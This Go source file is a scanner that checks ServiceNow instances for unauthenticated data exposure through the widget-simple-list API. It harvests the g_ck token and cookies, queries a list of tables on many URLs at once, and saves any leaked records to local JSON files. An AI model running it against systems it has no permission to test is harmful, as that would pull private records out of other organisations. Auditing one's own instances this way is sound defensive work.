package main

import (
	"bufio"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
)

type CheckResult struct {
	URL        string
	Vulnerable bool
	Table      string
}

func checkVulnerability(baseURL, gCkValue string, cookies []*http.Cookie, client *http.Client, fastCheck bool, table string) ([]string, error) {
	// If fastCheck is true, only check the "kb_knowledge" table
	if fastCheck && table != "t=kb_knowledge" {
		return []string{}, nil
	}

	vulnerableURLs := []string{}

	reqURL := fmt.Sprintf("%s/api/now/sp/widget/widget-simple-list?%s", baseURL, table)
	req, err := http.NewRequest("POST", reqURL, strings.NewReader("{}")) // Empty JSON payload

	if err != nil {
		return nil, err
	}

	for _, cookie := range cookies {
		req.AddCookie(cookie)
	}

	// Parse the baseURL to extract the subdomain as folderName
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return nil, fmt.Errorf("error parsing URL %s: %v", baseURL, err)
	}
	subdomain := strings.Split(parsedURL.Hostname(), ".")[0]

	req.Header.Set("X-UserToken", gCkValue)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close() // Ensure the body is closed

	if resp.StatusCode == 200 || resp.StatusCode == 201 {
		var response map[string]interface{}
		err := json.NewDecoder(resp.Body).Decode(&response)
		if err != nil {
			return nil, err
		}

		result, exists := response["result"].(map[string]interface{})
		if !exists {
			return nil, fmt.Errorf("unexpected response structure from %s", reqURL)
		}

		data, dataExists := result["data"].(map[string]interface{}) // JSON numbers are float64 in Go

		if !dataExists {
			return nil, fmt.Errorf("no data key in response from %s", reqURL)
		}

		list, listExists := data["list"].([]interface{})
		if !listExists {
			return vulnerableURLs, nil
		} else if len(list) == 0 {
			fmt.Printf("%s is EXPOSED, but data is NOT leaking likely because ACLs are blocking. Mark Widgets as not Public.\n", reqURL)
		} else {
			fmt.Printf("%s is EXPOSED, and LEAKING data. Check ACLs ASAP.\n", reqURL)
			listJSON, err := json.Marshal(list)
			if err != nil {
				fmt.Printf("Error marshaling list to JSON: %s\n", err)
				return nil, err
			}

			// Create a file with the table name
			dirPath := filepath.Join("result", subdomain)
			err = os.MkdirAll(dirPath, 0755) // Creates the directory if it doesn't exist
			if err != nil {
				return nil, fmt.Errorf("error creating directory: %v", err)
			}

			// Construct file path with directory, subdomain, and table name
			fileName := filepath.Join(dirPath, fmt.Sprintf("%s.json", strings.TrimPrefix(table, "t="))) // Extracts 'tableName' from 't=tableName'
			file, err := os.Create(fileName)
			if err != nil {
				fmt.Printf("Error creating file: %s\n", err)
				return nil, err
			}

			// Write the JSON data to the file
			_, err = file.Write(listJSON)
			if err != nil {
				fmt.Printf("Error writing to file: %s\n", err)
				file.Close() // Ensure file is closed before returning
				return nil, err
			}

			file.Close()
			vulnerableURLs = append(vulnerableURLs, reqURL) // Add the URL to the list of vulnerable URLs
		}
	} else {
		return nil, fmt.Errorf("received status code %d for %s", resp.StatusCode, reqURL)
	}

	return vulnerableURLs, nil
}

func getGCKAndCookies(urlString, proxy string) (string, []*http.Cookie, error) {
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
	}

	if proxy != "" {
		proxyURL, _ := url.Parse(proxy)
		client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
	}

	resp, err := client.Get(urlString)
	if err != nil {
		return "", nil, err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", nil, err
	}

	// Extract g_ck using regex
	re := regexp.MustCompile(`var g_ck = '([a-zA-Z0-9]+)'`)
	match := re.FindStringSubmatch(string(body))

	if len(match) != 2 {
		return "", nil, errors.New("g_ck not found")
	}

	gCkValue := match[1]
	cookies := jar.Cookies(resp.Request.URL)
	cookieStrings := make([]string, len(cookies))
	for i, cookie := range cookies {
		// String() method of http.Cookie returns the serialized cookie
		cookieStrings[i] = cookie.String()
	}
	cookieHeader := strings.Join(cookieStrings, "; ")
	fmt.Printf("X-UserToken: %s\n", gCkValue)
	fmt.Printf("Cookie: %s\n\n\n", cookieHeader)

	return gCkValue, cookies, nil
}

func readTableNamesFromFile(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, fmt.Sprintf("t=%s", scanner.Text()))
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return lines, nil
}

func main() {
	tableListFile := "table_list.txt"
	tableList, err := readTableNamesFromFile(tableListFile)
	if err != nil {
		fmt.Printf("Error reading table names from file: %s\n", err)
		os.Exit(1)
	}

	urlPtr := flag.String("url", "", "The URL to fetch from")
	filePtr := flag.String("file", "", "File of URLs")
	fastCheckPtr := flag.Bool("fast-check", false, "Only check for the table incident")
	proxyPtr := flag.String("proxy", "", "Proxy server in the format http://host:port")
	flag.Parse()

	if *urlPtr == "" && *filePtr == "" {
		fmt.Println("Error: Either --url or --file must be specified.")
		os.Exit(1)
	}

	var urls []string

	if *urlPtr != "" {
		urls = append(urls, *urlPtr)
	} else {
		fileData, err := os.ReadFile(*filePtr)
		if err != nil {
			fmt.Printf("Error reading file: %s\n", err)
			os.Exit(1)
		}
		urls = strings.Split(string(fileData), "\n")
	}

	client := &http.Client{}
	if *proxyPtr != "" {
		proxyURL, _ := url.Parse(*proxyPtr)
		client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
	}

	concurrencyLimit := 10 // Set this to a reasonable value
	semaphore := make(chan struct{}, concurrencyLimit)

	var anyVulnerable int32
	var wg sync.WaitGroup
	results := make(chan CheckResult, len(urls)*len(tableList))

	for _, url := range urls {
		gCk, cookies, err := getGCKAndCookies(url, *proxyPtr)
		if err != nil {
			fmt.Printf("Error fetching g_ck for %s: %v\n", url, err)
			continue // Skip this URL on error
		}

		for _, table := range tableList {
			wg.Add(1)
			go func(url, table, gCk string, cookies []*http.Cookie) {
				semaphore <- struct{}{} // acquire semaphore
				defer wg.Done()
				defer func() { <-semaphore }() // release semaphore

				vulnerableUrls, err := checkVulnerability(url, gCk, cookies, client, *fastCheckPtr, table)
				if err != nil {
					fmt.Printf("Error checking vulnerability for %s: %v\n", url, err)
					results <- CheckResult{URL: url, Vulnerable: false, Table: table}
					return
				}

				isVulnerable := len(vulnerableUrls) > 0
				if isVulnerable {
					atomic.StoreInt32(&anyVulnerable, 1)
				}

				results <- CheckResult{URL: url, Vulnerable: isVulnerable, Table: table}
			}(url, table, gCk, cookies)
		}
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	for range results {
		// This loop consumes the results channel without doing anything with the results.
	}

	if atomic.LoadInt32(&anyVulnerable) == 1 {
		fmt.Println("Scanning completed. Vulnerable URLs found.")
	} else {
		fmt.Println("Scanning completed. No vulnerable URLs found.")
	}
}
